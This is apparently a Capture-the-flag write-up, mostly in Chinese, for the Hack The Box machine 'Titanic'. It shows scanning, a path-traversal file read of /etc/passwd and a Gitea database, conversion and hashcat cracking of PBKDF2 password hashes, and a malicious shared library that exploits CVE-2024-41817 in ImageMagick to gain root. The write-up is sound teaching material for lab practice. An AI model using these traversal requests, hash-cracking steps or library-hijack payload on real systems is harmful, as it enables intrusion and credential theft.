![](Titanic.png)
# Titanic
### Linux · Easy
#### from https://app.hackthebox.com/machines/648
> **IP 10.10.11.55**

### `Nmap`
```
☠️$ sudo nmap -sC -sV -p- --min-rate 10000 10.10.11.55
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
☠️$ sudo nmap --script=vuln -p80,22   10.10.11.55   
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.

☠️$ sudo gobuster vhost -u http://titanic.htb -w subdomains-top1million-20000.txt -t 30 --append-domain --exclude-length 300-350  
Found: dev.titanic.htb Status: 200 [Size: 13982]

☠️$ sudo sh -c 'echo "10.10.11.55    titanic.htb" >> /etc/hosts'
☠️$ echo "10.10.11.55    dev.titanic.htb" | sudo tee -a /etc/hosts
```
#### ok 让我们直接看web页面
### `目录枚举`
```
☠️$ sudo gobuster dir -u http://titanic.htb/  -w subdomains-top1million-20000.txt 
/download             (Status: 400) [Size: 41]
/book                 (Status: 405) [Size: 153]
```
![](1.png)
![](2.png)
### 直接尝试文件包含
![](3.png)
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
#### developer is user
```
GET /download?ticket=../../../../home/developer/user.txt
```
### 继续进行ROOT
#### 我们发现dev.titanic.htb是一个gitea,注册后发现有两个库
![](4.png)
#### 在docker-config/gitea/docker-compose.yml中,我们发现这个
```
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```
### /home/developer/gitea/data 是搭建gitea的地方,而且是本地搭建,让我们使用前面的LFI来拼接目录读取app.ini
![](5.png)
![](6.png)
```
☠️$ wget -O gitea.db "http://titanic.htb/download?ticket=./../../../home/developer/gitea/data/gitea/gitea.db"
☠️$ sqlite3 gitea.db                                                                                         
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
☠️sqlite> .tables
access                     oauth2_grant             
access_token               org_user                 
action                     package                  
action_artifact            package_blob             
action_run                 package_blob_upload      
action_run_index           package_cleanup_rule     
action_run_job             package_file             
action_runner              package_property         
action_runner_token        package_version          
action_schedule            project                  
action_schedule_spec       project_board            
action_task                project_issue            
action_task_output         protected_branch         
action_task_step           protected_tag            
action_tasks_version       public_key               
action_variable            pull_auto_merge          
app_state                  pull_request             
attachment                 push_mirror              
auth_token                 reaction                 
badge                      release                  
branch                     renamed_branch           
collaboration              repo_archiver            
comment                    repo_indexer_status      
commit_status              repo_redirect            
commit_status_index        repo_topic               
commit_status_summary      repo_transfer            
dbfs_data                  repo_unit                
dbfs_meta                  repository               
deploy_key                 review                   
email_address              review_state             
email_hash                 secret                   
external_login_user        session                  
follow                     star                     
gpg_key                    stopwatch                
gpg_key_import             system_setting           
hook_task                  task                     
issue                      team                     
issue_assignees            team_invite              
issue_content_history      team_repo                
issue_dependency           team_unit                
issue_index                team_user                
issue_label                topic                    
issue_user                 tracked_time             
issue_watch                two_factor               
label                      upload                   
language_stat              user                     
lfs_lock                   user_badge               
lfs_meta_object            user_blocking            
login_source               user_open_id             
milestone                  user_redirect            
mirror                     user_setting             
notice                     version                  
notification               watch                    
oauth2_application         webauthn_credential      
oauth2_authorization_code  webhook                  
☠️sqlite> pragma table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
13|type|INTEGER|0||0
14|location|TEXT|0||0
15|website|TEXT|0||0
16|rands|TEXT|0||0
17|salt|TEXT|0||0
18|language|TEXT|0||0
19|description|TEXT|0||0
20|created_unix|INTEGER|0||0
21|updated_unix|INTEGER|0||0
22|last_login_unix|INTEGER|0||0
23|last_repo_visibility|INTEGER|0||0
24|max_repo_creation|INTEGER|1|-1|0
25|is_active|INTEGER|0||0
26|is_admin|INTEGER|0||0
27|is_restricted|INTEGER|1|0|0
28|allow_git_hook|INTEGER|0||0
29|allow_import_local|INTEGER|0||0
30|allow_create_organization|INTEGER|0|1|0
31|prohibit_login|INTEGER|1|0|0
32|avatar|TEXT|1||0
33|avatar_email|TEXT|1||0
34|use_custom_avatar|INTEGER|0||0
35|num_followers|INTEGER|0||0
36|num_following|INTEGER|1|0|0
37|num_stars|INTEGER|0||0
38|num_repos|INTEGER|0||0
39|num_teams|INTEGER|0||0
40|num_members|INTEGER|0||0
41|visibility|INTEGER|1|0|0
42|repo_admin_change_team_access|INTEGER|1|0|0
43|diff_view_style|TEXT|1|''|0
44|theme|TEXT|1|''|0
45|keep_activity_private|INTEGER|1|0|0
☠️sqlite> select id,name,passwd,salt,passwd_hash_algo from user;
1|administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|pbkdf2$50000$50
2|developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|pbkdf2$50000$50
```
ok 我们回到app.ini
```
[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2
```
他说pbkdf2加密 让我们看
https://github.com/hashcat/hashcat/pull/4154/commits/faa680fbab803723d77449b7107c1c985a6b7981
https://github.com/hashcat/hashcat/blob/faa680fbab803723d77449b7107c1c985a6b7981/tools/gitea2hashcat.py
gitea2hashcat.py
```
#!/usr/bin/python3
# Converts gitea PBKDF2-HMAC-SHA256 hashes into a format hashcat can use
# written by unix-ninja

import argparse
import base64
import sys

def convert_hash(hash_string):
    """Converts a SALT+HASH string to a hashcat compatible format,
       ensuring the smaller input is treated as the salt.
       Use : or | as delimeters.
    """
    hash_string = hash_string.replace('|', ':')
    try:
        part1, part2 = hash_string.split(":")
    except ValueError:
        print(f"[-] Invalid input format: {hash_string}")
        return None

    try:
        bytes1 = bytes.fromhex(part1)
        bytes2 = bytes.fromhex(part2)
    except ValueError:
      print(f"[-] Invalid hex input: {hash_string}")
      return None

    # If lengths are equal, we will maintain the original order
    if len(bytes1) > len(bytes2):
        salt_bytes = bytes2
        hash_bytes = bytes1
    else:  
        salt_bytes = bytes1
        hash_bytes = bytes2


    salt_b64 = base64.b64encode(salt_bytes).decode('utf-8')
    hash_b64 = base64.b64encode(hash_bytes).decode('utf-8')

    return f"sha256:50000:{salt_b64}:{hash_b64}"


def main():
    parser = argparse.ArgumentParser(description="Convert Gitea SALT+HASH strings to a hashcat-compatible format.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Example:
    gitea2hashcat.py <salt1>:<hash1> <hash2>|<salt2> ... or pipe input from stdin.
        
    You can also dump output straight from sqlite into this script:
        sqlite3 gitea.db 'select salt,passwd from user;' | gitea2hashcat.py""")
    parser.add_argument('hashes', nargs='*', help='SALT+HASH strings to convert')
    args = parser.parse_args()

    # ... (rest of the main function remains the same)
    print("[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)")
    print()

    if args.hashes:
        # Process command-line arguments
        for hash_string in args.hashes:
            converted_hash = convert_hash(hash_string)
            if converted_hash:
                print(converted_hash)

    else:
        # Process input from stdin
        for line in sys.stdin:
            hash_string = line.strip()  # Remove leading/trailing whitespace
            converted_hash = convert_hash(hash_string)
            if converted_hash:
                print(converted_hash)


if __name__ == "__main__":
    main()
```
#### 这个脚本的内容异常简单,我们也可以自己编写一个
```
import base64
import sys

def hex_to_base64(hex_string):
    """将十六进制字符串转换为 Base64 编码"""
    hash_bytes = bytes.fromhex(hex_string)
    hash_b64 = base64.b64encode(hash_bytes).decode('utf-8')
    return hash_b64

def process_hashes(hash_input):
    """处理输入的哈希，返回格式化的结果和短哈希"""
    hashes = hash_input.split('|')
    
    if len(hashes) != 2:
        raise ValueError("输入应包含两个哈希，格式为 '短哈希|长哈希'")

    short_hash = hashes[0]
    long_hash = hashes[1]

    # 判断短的和长的
    if len(short_hash) > len(long_hash):
        short_hash, long_hash = long_hash, short_hash

    # 格式化结果
    formatted_result = f"sha256:50000:{hex_to_base64(short_hash)}:{hex_to_base64(long_hash)}"
    return formatted_result

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("使用方法: python3 giteahash.py '加密数据'")
        sys.exit(1)

    encrypted_data = sys.argv[1]
    try:
        # 处理哈希并格式化输出
        output_string = process_hashes(encrypted_data)
        print(output_string)
    except ValueError as ve:
        print(ve)
```
### 使用hackcat
```
hashcat -m 10900 "sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=" rockyou.txt
```
### 得到密码 25282528
```
☠️ sudo ssh developer@10.10.11.55
☠️ developer@titanic:~$ find / -writable -type d 2>/dev/null
我们可以看到 /opt/app/static/assets/images
☠️ developer@titanic:~$ cd /opt/app/static/assets/images
☠️ developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home.jpg  luxury-cabins.jpg  metadata.log  root.jpg
☠️developer@titanic:/opt/app/static/assets/images$ cd /opt
☠️developer@titanic:/opt$ ls
app  containerd  scripts
☠️developer@titanic:/opt$ cd scripts
☠️developer@titanic:/opt/scripts$ ls
 identify_images.sh
☠️developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```
#### 我们可以看到ImageMagick,因为这个/usr/bin/magick是他的默认安装路径
#### 搜索vulnerable记录,我们锁定在CVE-2024-41817 参考:
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
```
☠️developer@titanic:/opt/scripts$ cd /opt/app/static/assets/images
☠️developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt ");
    exit(0);
}
EOF
等待....
☠️developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg     favicon.ico  luxury-cabins.jpg  root.jpg
exquisite-dining.jpg  home.jpg     metadata.log       root.txt
☠️developer@titanic:/opt/app/static/assets/images$ cat root.txt
40ce729422334d10de01a6e00cab6f56
```
## PWN


